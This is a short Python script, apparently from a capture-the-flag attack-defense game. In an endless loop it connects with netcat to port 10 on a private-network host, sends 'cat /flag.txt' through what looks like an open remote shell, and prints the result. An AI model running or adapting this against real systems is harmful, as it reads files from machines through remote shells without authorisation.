from re import T
import pexpect

while True:
    host='192.168.132.35'
    a=pexpect.spawn("nc %s 10"%host)
    a.setecho(False)
    a.sendline('cat /flag.txt')
    a.sendline('exit')
    flag=a.read()
    print(host+':'+flag)